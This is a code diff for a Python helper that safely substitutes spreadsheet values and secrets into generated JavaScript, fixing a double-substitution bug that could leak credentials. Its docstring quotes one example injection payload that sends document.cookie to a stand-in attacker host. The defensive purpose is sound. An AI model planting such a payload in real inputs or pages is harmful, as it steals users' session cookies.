@@ -118,14 +118,19 @@ def render_template(value: Any, *, inputs: dict[str, Any], secrets: dict[str, An
     return value
 
 
-#: A template with its surrounding quote, as it appears inside generated
-#: JavaScript: ``page.fill('#name', '{{input.full_name}}')``.
-_QUOTED_TEMPLATE_RE = re.compile(
-    # The trailing backreference matters: it requires the *same* quote to
-    # close, so the whole literal is consumed and replaced. Without it the
-    # JSON value lands between the original quotes -- producing '"Nitin"',
-    # and for a value containing a quote, an escape out of the string.
+#: One pattern for both spellings a template can have inside JavaScript:
+#: quoted (``page.fill('#name', '{{input.x}}')``) or bare
+#: (``const n = {{input.x}};``).
+#:
+#: They are matched together, in one alternation, so that a single pass over
+#: the source handles both. Two passes would rescan the first pass's output --
+#: see render_code for why that is a security bug and not just untidy.
+_CODE_TEMPLATE_RE = re.compile(
+    # Quoted form first: the backreference requires the *same* quote to close,
+    # so the whole literal is consumed and replaced by one JSON literal rather
+    # than leaving the original quotes wrapped around it.
     r"""(['"`])\{\{\s*(input|secret|env)\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}\1"""
+    r"""|\{\{\s*(input|secret|env)\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}"""
 )
 
 
@@ -138,22 +143,32 @@ def render_code(
 ) -> str:
     """Substitute templates into JavaScript source, safely.
 
-    This cannot use :func:`render_template`. That one splices the raw value in
-    where the template was, which is correct for a form field and a code
-    injection vulnerability here: a value of
+    Two distinct hazards, and the second is easy to miss.
+
+    **Splicing raw values into source is code injection.** This is why
+    :func:`render_template` cannot be used here: it puts the value where the
+    template was, which is right for a form field and wrong for JavaScript. A
+    value of::
 
         '); fetch('https://evil.example/'+document.cookie); ('
 
-    would close the string literal it sits in and run whatever follows. The
-    values come from a spreadsheet that may have been assembled by someone with
-    no idea their data reaches a browser, so this is a real path rather than a
-    theoretical one.
+    would close the string literal it sits in and run what follows. The values
+    come from a spreadsheet somebody may have assembled with no idea it reaches
+    a browser, so this is a real path. Each value is therefore emitted as a
+    JSON literal: ``json.dumps`` escapes quotes, backslashes and newlines, and
+    ``ensure_ascii`` turns U+2028/U+2029 into escapes, which JavaScript would
+    otherwise read as line terminators.
 
-    Each value is therefore emitted as a JSON literal -- ``json.dumps`` escapes
-    quotes, backslashes and newlines, and ``ensure_ascii`` turns U+2028/U+2029
-    into escapes, which JavaScript would otherwise read as line terminators. A
-    quoted template consumes its quotes so the result is one literal rather
-    than a literal nested inside a string.
+    **Substituting twice re-expands the values.** ``re.sub`` does not rescan
+    what it inserted, but a *second* ``sub`` call scans the first one's output.
+    An earlier version of this function ran one pass for quoted templates and
+    another for bare ones, so an input whose value was the text
+    ``{{secret.password}}`` had that value substituted and then expanded --
+    rendering the real credential into the page. A row of batch input could
+    read any secret bound to the run.
+
+    Hence one pattern and one pass. What a value contains is data, and stays
+    data.
     """
     sources = {"input": inputs, "secret": secrets, "env": env or {}}
 
@@ -164,10 +179,13 @@ def render_code(
         value = source[name]
         return json.dumps("" if value is None else str(value), ensure_ascii=True)
 
-    # Quoted first, so the quotes are consumed rather than left wrapping the
-    # JSON literal this produces.
-    code = _QUOTED_TEMPLATE_RE.sub(lambda m: literal(m.group(2), m.group(3)), code)
-    return TEMPLATE_RE.sub(lambda m: literal(m.group(1), m.group(2)), code)
+    def replace(match: re.Match[str]) -> str:
+        # Groups 1-3 are the quoted alternative, 4-5 the bare one.
+        if match.group(2) is not None:
+            return literal(match.group(2), match.group(3))
+        return literal(match.group(4), match.group(5))
+
+    return _CODE_TEMPLATE_RE.sub(replace, code)
 
 
 # ---------------------------------------------------------------------------
